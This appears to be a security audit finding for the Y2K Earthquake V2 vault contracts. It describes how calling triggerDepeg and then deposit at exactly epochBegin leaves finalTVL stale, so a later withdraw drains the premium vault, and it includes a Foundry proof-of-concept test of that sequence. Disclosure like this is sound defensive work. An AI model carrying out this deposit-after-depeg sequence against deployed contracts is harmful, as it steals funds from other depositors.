# attacker can drain the premium vault if depegging happens before the epoch starts

## Summary
If the epoch begins with the price of the asset below the strike (the depeg happened before the epoch started), then the attacker can drain the premium vault by depositing & withdrawing after calling triggerDepeg (in the same transaction) at a specific time .

## Vulnerability Detail
Firstly, note that block.timestamp can be manipulated.

https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/VaultV2.sol#L433
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/VaultV2.sol#L441
Observe that block.timestamp = epochConfig[_id].epochBegin passes the check in both epochHasStarted and epochHasNotStarted. 

https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Controllers/ControllerPeggedAssetV2.sol#L71-L73
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/VaultV2.sol#L294
This means that when block.timestamp == epochConfig[_id].epochBegin, it's possible to first call the controller's triggerDepeg function (assuming that depegging has already happened).

https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/VaultV2.sol#L102
And then call deposit. 

https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Controllers/ControllerPeggedAssetV2.sol#L88
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/VaultV2.sol#L298
The problem with this is the epoch has already been resolved in triggerDepeg. So, finalTVL no longer reflects the total amount of assets deposited into this epoch.

https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/VaultV2.sol#L366
The malicious user will now get much more than they are supposed to when they call withdraw. 

https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Controllers/ControllerPeggedAssetV2.sol#L106-L123
Observe that ClaimTVL is set to be the amount of assets sent to the premium vault from the collateral vault. The fact that finalTVL is less than the actual amount of assets for this epoch means that the fund from the collateral vault won't be enough. Therefore, this extra amount that the malicious user is getting is coming from assets that are supposed to be for other users and epochs.
See the POC for more detail.

## Impact
Observe that this attack can fully drain the premium vault - not just the assets for that specific epoch. This causes the protocol and the other users to incur a substantial loss. Although depegging is a rare event, and manipulating block.timestamp to equal epochBegin isn't always guaranteed, I still think this qualifies for high severity since the consequences are dire, and this project is designed specifically for depegging events.

## Code Snippet
Please add the following test into EndToEndV2Test.t.sol and run it by itself `forge test -m testDepositAfterDepeg`
```solidity
function testDepositAfterDepeg() public {
        // pretend this is the underlying assets for other epochs & users
        MintableToken(UNDERLYING).mint(depegPremium);
        vm.warp(begin - 10 days);

        uint256 prev_balance = MintableToken(UNDERLYING).balanceOf(USER);
        
        // using a different user to deposit into the collateral vault to 
        // better illustrate this point
        vm.startPrank(USER2);
        MintableToken(UNDERLYING).mint(USER2);
        MintableToken(UNDERLYING).approve(depegCollateral, COLLAT_DEPOSIT_AMOUNT);
        VaultV2(depegCollateral).deposit(depegEpochId, COLLAT_DEPOSIT_AMOUNT, USER2);
        vm.stopPrank();

        vm.startPrank(USER);

        // deposit before the epoch starts
        MintableToken(UNDERLYING).approve(depegPremium, DEALT_AMOUNT*10);
        VaultV2(depegPremium).deposit(depegEpochId, PREMIUM_DEPOSIT_AMOUNT, USER);

        // manipulate block.timestamp to be exactly the time that this epoch starts
        vm.warp(begin);
        // immediately trigger depeg
        controller.triggerDepeg(depegMarketId, depegEpochId);
        // deposit again after the depeg (which shouldn't happen if this vuln doesn't exist)
        VaultV2(depegPremium).deposit(depegEpochId, PREMIUM_DEPOSIT_AMOUNT*9, USER);
        // withdraw from vaults
        VaultV2(depegPremium).withdraw(depegEpochId, PREMIUM_DEPOSIT_AMOUNT*10, USER, USER);

        uint256 cur_balance = MintableToken(UNDERLYING).balanceOf(USER);

        // the user's profit is more than 5 times (possibly more) the amount of assets 
        // the collateral vault sent to the premium vault
        assertTrue(5*VaultV2(depegPremium).claimTVL(depegEpochId) < cur_balance - prev_balance);
        vm.stopPrank();
    }
```
